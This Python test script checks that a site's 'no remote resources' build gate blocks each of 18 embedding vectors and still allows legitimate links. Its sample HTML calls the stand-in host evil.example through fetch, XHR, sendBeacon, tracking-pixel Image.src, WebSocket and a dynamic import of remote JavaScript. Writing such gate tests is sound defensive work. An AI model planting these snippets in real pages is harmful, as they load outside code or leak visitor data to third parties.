#!/usr/bin/env python3
"""证明「无第三方运行时资源」门禁真的会拦住每一种向量。

红队第二轮指出原实现漏了 srcset / poster / iframe / new Image() / XHR。
这个脚本对每种向量都植入一次，要求门禁 exit 1；最后再验证干净产物 exit 0。

用法：python tests/logic/test_gate_no_remote.py
"""
from __future__ import annotations

import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
GATE = ROOT / "tools" / "check_no_remote.py"

VECTORS = [
    ("link preconnect", '<link rel="preconnect" href="//cdn.evil.example">'),
    ("source srcset", '<source srcset="https://evil.example/a.webp 1x, https://evil.example/b.webp 2x">'),
    ("img srcset", '<img srcset="https://evil.example/a.png 2x" src="./ok.png">'),
    ("video poster", '<video poster="https://evil.example/p.jpg"></video>'),
    ("iframe src", '<iframe src="https://evil.example/x"></iframe>'),
    ("embed src", '<embed src="https://evil.example/e.swf">'),
    ("object data", '<object data="https://evil.example/o.svg"></object>'),
    ("form action", '<form action="https://evil.example/submit"></form>'),
    ("@import url()", '<style>@import url("https://evil.example/a.css");</style>'),
    ("@import bare", '<style>@import "https://evil.example/b.css";</style>'),
    ("css url()", '<style>body{background:url(https://evil.example/bg.png)}</style>'),
    ("js fetch", '<script>fetch("https://evil.example/api")</script>'),
    ("js XHR", '<script>new XMLHttpRequest().open("GET","https://evil.example")</script>'),
    ("js Image.src", '<script>new Image().src="https://evil.example/t.gif"</script>'),
    ("js sendBeacon", '<script>navigator.sendBeacon("https://evil.example/b")</script>'),
    ("js WebSocket", '<script>new WebSocket("wss://evil.example/ws")</script>'),
    ("js EventSource", '<script>new EventSource("https://evil.example/s")</script>'),
    ("js dynamic import", '<script>import("https://evil.example/m.js")</script>'),
]

# 这些是合法的、必须放行的写法
LEGIT = [
    ("相对路径", '<img src="./assets/x.webp" alt="">'),
    ("根相对", '<link rel="stylesheet" href="/styles/app.css">'),
    ("data URI", '<img src="data:image/svg+xml;base64,AAAA" alt="">'),
    ("锚点", '<a href="#/cabinet">go</a>'),
    ("同源绝对", '<a href="https://tbj0623.github.io/zero-dossier-office/">site</a>'),
    ("w3 命名空间", '<svg xmlns="http://www.w3.org/2000/svg"></svg>'),
    ("许可证链接", '<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC</a>'),
]


def run_gate(dist: Path) -> tuple[int, str]:
    r = subprocess.run(
        [sys.executable, str(GATE), str(dist)],
        capture_output=True, text=True, encoding="utf-8",
    )
    return r.returncode, (r.stdout or "") + (r.stderr or "")


def main() -> int:
    failures: list[str] = []
    with tempfile.TemporaryDirectory() as tmp:
        dist = Path(tmp) / "dist"
        dist.mkdir()
        probe = dist / "p.html"

        caught = 0
        for name, html in VECTORS:
            probe.write_text(html, encoding="utf-8")
            code, _ = run_gate(dist)
            if code == 1:
                caught += 1
            else:
                failures.append(f"漏过：{name}")

        allowed = 0
        for name, html in LEGIT:
            probe.write_text(html, encoding="utf-8")
            code, out = run_gate(dist)
            if code == 0:
                allowed += 1
            else:
                failures.append(f"误杀：{name} -> {out.strip()[:80]}")

        probe.unlink()

    print(f"拦住坏输入：{caught}/{len(VECTORS)}")
    print(f"放行好输入：{allowed}/{len(LEGIT)}")
    if failures:
        print("\n失败项：")
        for f in failures:
            print("  " + f)
        return 1

    # 真实 dist 也必须干净
    real_dist = ROOT / "dist"
    if real_dist.is_dir():
        code, out = run_gate(real_dist)
        print(f"真实 dist：{'通过' if code == 0 else '失败 -> ' + out.strip()[:100]}")
        if code != 0:
            return 1

    print("PASS 门禁对全部已知向量有效，且不误杀合法写法")
    return 0


if __name__ == "__main__":
    sys.exit(main())
